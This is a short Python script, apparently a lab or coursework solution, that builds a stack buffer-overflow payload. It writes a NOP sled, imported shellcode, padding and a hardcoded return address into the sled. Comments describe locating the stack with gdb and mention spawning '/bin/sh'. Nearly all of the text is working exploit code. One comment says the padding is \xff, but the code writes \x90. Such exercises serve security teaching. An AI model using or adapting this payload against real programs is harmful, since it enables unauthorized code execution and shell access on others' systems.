from shellcode import shellcode
import sys

# need to set return address to system
# need to set argument address to buf
# need to have buf contain "/bin/sh"

if __name__ == "__main__":

    # 971 bytes of nop (\x90)
    sys.stdout.buffer.write(b"\x90" * 971)
    
    # 53 bytes shellcode
    sys.stdout.buffer.write(shellcode)   

    # 12 bytes padding (\xff) to saved instr pointer
    sys.stdout.buffer.write(b"\x90" * 12)

    # write address of somewhere in nop
    # use gdb to find starting address of nop (esp)
    # add 300 or so to that address
    # the new address will always land in nop sled  no matter what the shift is

    sys.stdout.buffer.write(b"\x80\xd5\xf6\xff")

